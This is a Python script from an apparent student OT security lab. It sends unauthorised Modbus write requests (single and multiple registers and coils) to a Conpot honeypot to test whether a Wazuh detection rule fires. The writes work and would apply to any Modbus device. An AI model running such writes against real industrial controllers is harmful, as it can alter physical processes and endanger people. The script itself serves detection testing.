#!/usr/bin/env python3
"""
AquaGrid OT Lab - Modbus Write Attack Simulation
CY376 Project - Nana Kwaku Tweneboah

This script deliberately sends unauthorised Modbus write requests
to the Conpot honeypot. It should trigger Wazuh rule 100215.

Usage:
  python3 attack-modbus-write.py <CONPOT-IP> [port]

Example:
  python3 attack-modbus-write.py 192.168.56.20
  python3 attack-modbus-write.py 192.168.56.20 502
"""

import sys
import time

try:
    from pymodbus.client import ModbusTcpClient
except ImportError:
    print("[!] pymodbus not installed. Run: pip3 install pymodbus")
    sys.exit(1)


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <CONPOT-IP> [port]")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 502

    print(f"[*] Connecting to Modbus target {host}:{port}")
    client = ModbusTcpClient(host, port=port, timeout=5)

    if not client.connect():
        print("[!] Connection failed. Is Conpot running?")
        sys.exit(1)

    print("[+] Connected. Sending unauthorised write requests...\n")

    # Function code 6 - Write Single Register
    print("[>] FC06 - Write Single Register (address 0, value 999)")
    result = client.write_register(0, 999, slave=1)
    print(f"    Result: {result}\n")
    time.sleep(1)

    # Function code 5 - Write Single Coil
    print("[>] FC05 - Write Single Coil (address 0, value ON)")
    result = client.write_coil(0, True, slave=1)
    print(f"    Result: {result}\n")
    time.sleep(1)

    # Function code 16 - Write Multiple Registers
    print("[>] FC16 - Write Multiple Registers (address 0, values [111,222,333])")
    result = client.write_registers(0, [111, 222, 333], slave=1)
    print(f"    Result: {result}\n")
    time.sleep(1)

    # Function code 15 - Write Multiple Coils
    print("[>] FC15 - Write Multiple Coils")
    result = client.write_coils(0, [True, False, True, True], slave=1)
    print(f"    Result: {result}\n")

    client.close()
    print("[*] Done. Check Wazuh Dashboard for rule 100215 alerts.")


if __name__ == "__main__":
    main()
